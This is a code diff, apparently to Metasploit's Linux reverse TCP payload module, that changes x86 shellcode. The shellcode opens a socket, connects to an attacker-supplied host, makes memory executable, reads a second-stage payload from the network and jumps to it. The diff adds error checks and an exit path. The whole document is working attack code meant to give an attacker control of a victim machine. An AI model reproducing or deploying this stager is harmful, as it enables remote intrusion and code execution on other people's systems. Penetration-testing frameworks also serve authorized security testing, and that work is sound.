@@ -91,49 +91,61 @@ module Payload::Linux::ReverseTcp
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
 
     asm = %Q^
-      xor ebx, ebx
-      mul ebx
-      push ebx
-      inc ebx
-      push ebx
-      push 0x2
-      mov al, 0x66
-      mov ecx, esp
-      int 0x80                   ; sys_socketcall (socket())
+        xor ebx, ebx
+        mul ebx
+        push ebx
+        inc ebx
+        push ebx
+        push 0x2
+        mov al, 0x66
+        mov ecx, esp
+        int 0x80                   ; sys_socketcall (socket())
+        test eax, eax
+        js failed
 
-      xchg eax, edi              ; store the socket in edi
-      pop ebx                    ; set ebx back to zero
-      push #{encoded_host}
-      push #{encoded_port}
-      mov ecx, esp
-      push 0x66
-      pop eax
-      push eax
-      push ecx
-      push edi
-      mov ecx, esp
-      inc ebx
-      int 0x80                  ; sys_socketcall (connect())
+        xchg eax, edi              ; store the socket in edi
+        pop ebx                    ; set ebx back to zero
+        push #{encoded_host}
+        push #{encoded_port}
+        mov ecx, esp
+        push 0x66
+        pop eax
+        push eax
+        push ecx
+        push edi
+        mov ecx, esp
+        inc ebx
+        int 0x80                   ; sys_socketcall (connect())
+        test eax, eax
+        js failed
     ^
 
     asm << asm_send_uuid if include_send_uuid
 
     asm << %Q^
-      mov dl, 0x7
-      mov ecx, 0x1000
-      mov ebx, esp
-      shr ebx, 0xc
-      shl ebx, 0xc
-      mov al, 0x7d
-      int 0x80                  ; sys_mprotect
+        mov dl, 0x7
+        mov ecx, 0x1000
+        mov ebx, esp
+        shr ebx, 0xc
+        shl ebx, 0xc
+        mov al, 0x7d
+        int 0x80                  ; sys_mprotect
+        test eax, eax
+        js failed
 
-      pop ebx
-      mov ecx, esp
-      cdq
-      mov dh, 0xc
-      mov al, 0x3
-      int 0x80                  ; sys_read (recv())
-      jmp ecx
+        pop ebx
+        mov ecx, esp
+        cdq
+        mov dh, 0xc
+        mov al, 0x3
+        int 0x80                  ; sys_read (recv())
+        test eax, eax
+        js failed
+        jmp ecx
+      failed:
+        mov eax, 0x1
+        mov ebx, 0x1              ; set exit status to 1
+        int 0x80                  ; sys_exit
     ^
 
     asm
@@ -142,4 +154,3 @@ module Payload::Linux::ReverseTcp
 end
 
 end
-
